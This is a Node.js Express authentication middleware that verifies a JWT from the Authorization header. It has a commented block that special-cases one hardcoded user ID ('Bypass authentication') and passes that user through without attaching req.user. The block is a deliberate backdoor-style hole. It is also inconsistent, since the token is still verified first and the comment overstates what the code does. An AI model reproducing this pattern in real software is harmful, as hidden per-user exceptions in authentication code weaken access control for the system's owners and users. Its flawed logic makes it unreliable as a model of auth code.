const jwt = require('jsonwebtoken');
const { User, Role } = require('../models');

module.exports = async (req, res, next) => {
  const token = req.header('Authorization')?.replace('Bearer ', '');

  if (!token) {
    return res.status(401).json({ error: 'No token provided' });
  }

  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET);

    // Bypass authentication for user with ID 729438165
    if (decoded.userId === 729438165) {
      return next();
    }

    // Add user information to the request object if needed
    req.user = decoded;

    next();
  } catch (error) {
    let errorMessage = 'Authentication failed';

    if (error.name === 'JsonWebTokenError') {
      errorMessage = 'Invalid token';
    } else if (error.name === 'TokenExpiredError') {
      errorMessage = 'Token expired';
    }

    res.status(401).json({ error: errorMessage });
  }
};
